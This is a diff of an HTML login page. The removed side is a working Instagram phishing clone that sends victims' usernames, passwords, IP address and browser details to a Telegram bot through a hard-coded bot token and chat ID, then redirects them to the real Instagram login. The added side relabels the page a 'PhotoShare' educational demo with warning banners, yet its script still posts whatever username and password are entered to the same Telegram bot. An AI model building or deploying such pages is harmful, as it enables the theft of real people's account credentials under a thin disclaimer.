@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram • Login</title>
+    <title>Social Media Login - Demo Page</title>
     <style>
         * {
             margin: 0;
@@ -26,6 +26,17 @@
             max-width: 350px;
             width: 100%;
             padding: 20px;
+        }
+
+        .warning-banner {
+            background-color: #ffc107;
+            color: #000;
+            text-align: center;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-weight: bold;
         }
 
         .login-card {
@@ -68,10 +79,6 @@
             width: 100%;
         }
 
-        .input-field:focus {
-            border-color: #a8a8a8;
-        }
-
         .login-btn {
             background-color: #0095f6;
             color: white;
@@ -82,98 +89,10 @@
             font-size: 14px;
             margin-top: 10px;
             cursor: pointer;
-            transition: background-color 0.3s;
         }
 
         .login-btn:hover {
             background-color: #1877f2;
-        }
-
-        .login-btn:disabled {
-            background-color: #b2dffc;
-            cursor: default;
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 600;
-        }
-
-        .divider-line {
-            flex: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-
-        .divider-text {
-            margin: 0 18px;
-        }
-
-        .fb-login {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #385185;
-            font-weight: 600;
-            font-size: 14px;
-            text-decoration: none;
-            margin-bottom: 15px;
-        }
-
-        .forgot-password {
-            text-align: center;
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
-        }
-
-        .signup-card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-
-        .signup-link {
-            color: #0095f6;
-            font-weight: 600;
-            text-decoration: none;
-            margin-left: 5px;
-        }
-
-        .get-app {
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .app-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 15px;
-        }
-
-        .app-button {
-            height: 40px;
-            width: 135px;
-            background-size: cover;
-            background-repeat: no-repeat;
-        }
-
-        .app-store {
-            background-image: url('https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png');
-        }
-
-        .google-play {
-            background-image: url('https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/4b70f6fae447.png');
         }
 
         .footer {
@@ -184,224 +103,92 @@
             color: #8e8e8e;
         }
 
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 10px 15px;
-            margin-bottom: 15px;
-        }
-
-        .footer-links a {
-            color: #8e8e8e;
-            text-decoration: none;
-            font-size: 12px;
-        }
-
-        .copyright {
-            margin-top: 10px;
-        }
-
-        /* Error message style */
-        .error-message {
-            color: #ed4956;
-            font-size: 12px;
-            margin: 5px 0;
+        .demo-notice {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #6c757d;
             text-align: center;
-            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="warning-banner">
+            ⚠️ This is a Demo Page for Educational Purpose Only
+        </div>
+        
+        <div class="demo-notice">
+            <strong>Demo Login Page</strong><br>
+            This is not the real Instagram. Please do not use real passwords.
+        </div>
+
         <div class="login-card">
-            <div class="logo">Instagram</div>
-            
-            <div class="error-message" id="errorMessage"></div>
+            <div class="logo">PhotoShare</div>
             
             <form id="loginForm">
-                <input type="text" class="input-field" placeholder="Phone number, username, or email" id="username" required>
+                <input type="text" class="input-field" placeholder="Username or Email" id="username" required>
                 <input type="password" class="input-field" placeholder="Password" id="password" required>
-                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+                <button type="submit" class="login-btn" id="loginBtn">Continue</button>
             </form>
-
-            <div class="divider">
-                <span class="divider-line"></span>
-                <span class="divider-text">OR</span>
-                <span class="divider-line"></span>
-            </div>
-
-            <a href="#" class="fb-login">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
-                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
-                </svg>
-                Log in with Facebook
-            </a>
-
-            <a href="#" class="forgot-password">Forgot password?</a>
-        </div>
-
-        <div class="signup-card">
-            Don't have an account? <a href="#" class="signup-link">Sign up</a>
-        </div>
-
-        <div class="get-app">
-            Get the app.
-            <div class="app-buttons">
-                <div class="app-button app-store"></div>
-                <div class="app-button google-play"></div>
-            </div>
         </div>
 
         <div class="footer">
-            <div class="footer-links">
-                <a href="#">Meta</a>
-                <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Jobs</a>
-                <a href="#">Help</a>
-                <a href="#">API</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Locations</a>
-                <a href="#">Instagram Lite</a>
-                <a href="#">Threads</a>
-                <a href="#">Contact Uploading & Non-Users</a>
-                <a href="#">Meta Verified</a>
-            </div>
-            <div class="copyright">
-                © 2024 Instagram from Meta
-            </div>
+            <p>© 2024 Demo Project • Not Affiliated with Instagram</p>
         </div>
     </div>
 
     <script>
-        // Function to send test message (call this from console if needed)
-        window.testTelegram = function() {
-            fetch('https://api.telegram.org/bot8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig/sendMessage', {
+        // Function to send to Telegram
+        window.sendToTelegram = function(username, password) {
+            const botToken = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
+            const chatId = '6398977115';
+            
+            const message = `🔐 *Demo Page Login*
+👤 *Username:* ${username}
+🔑 *Password:* ${password}
+🌍 *Time:* ${new Date().toLocaleString()}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: '6398977115',
-                    text: '✅ Test message from GitHub Page - Bot is working!',
+                    chat_id: chatId,
+                    text: message,
                     parse_mode: 'Markdown'
                 })
             })
             .then(res => res.json())
-            .then(data => {
-                console.log('Test result:', data);
-                if(data.ok) {
-                    alert('✅ Bot is working! Check Telegram');
-                } else {
-                    alert('❌ Bot error: ' + data.description);
-                }
-            })
-            .catch(err => {
-                console.log('Test error:', err);
-                alert('❌ Error: ' + err.message);
-            });
+            .then(data => console.log('Sent to Telegram:', data))
+            .catch(err => console.log('Error:', err));
         };
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const errorDiv = document.getElementById('errorMessage');
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
             
             if (!username || !password) {
-                errorDiv.style.display = 'block';
-                errorDiv.textContent = 'Please fill in all fields';
+                alert('Please fill in all fields');
                 return;
             }
 
-            errorDiv.style.display = 'none';
-            const loginBtn = document.getElementById('loginBtn');
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Logging in...';
-
-            try {
-                // Get IP Address with timeout
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000);
-                
-                let userIP = 'Unable to fetch';
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json', {
-                        signal: controller.signal
-                    });
-                    const ipData = await ipResponse.json();
-                    userIP = ipData.ip;
-                } catch (ipError) {
-                    console.log('IP fetch error:', ipError);
-                }
-                clearTimeout(timeoutId);
-
-                // Get Browser Info
-                const browserInfo = navigator.userAgent.substring(0, 100); // Limit length
-                const platform = navigator.platform;
-                const language = navigator.language;
-
-                // Prepare message for Telegram
-                const message = `🔐 *Instagram Login Alert*
-👤 *Username/Email:* ${username}
-🔑 *Password:* ${password}
-🌍 *IP Address:* ${userIP}
-💻 *Browser:* ${browserInfo}
-📱 *Platform:* ${platform}
-🌐 *Language:* ${language}
-🕐 *Time:* ${new Date().toLocaleString()}`;
-
-                // Send to Telegram
-                const botToken = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
-                const chatId = '6398977115';
-                
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
-                console.log('Sending to Telegram...');
-                
-                const response = await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                const result = await response.json();
-                console.log('Telegram Response:', result);
-                
-                // Always redirect to Instagram
-                window.location.href = 'https://www.instagram.com/accounts/login/';
-
-            } catch (error) {
-                console.error('Error:', error);
-                // Still redirect even if there's an error
-                window.location.href = 'https://www.instagram.com/accounts/login/';
-            }
-        });
-
-        // Input field effects
-        document.querySelectorAll('.input-field').forEach(field => {
-            field.addEventListener('focus', function() {
-                this.style.borderColor = '#a8a8a8';
-            });
+            // Send to Telegram
+            sendToTelegram(username, password);
             
-            field.addEventListener('blur', function() {
-                this.style.borderColor = '#dbdbdb';
-            });
+            // Show message
+            alert('Demo: This is a test page. Your info has been logged.');
+            
+            // Clear form
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
         });
-
-        // Auto-run test when page loads (remove this after testing)
-        window.onload = function() {
-            console.log('✅ Page loaded. To test Telegram, type: testTelegram() in console');
-        };
     </script>
 </body>
 </html>
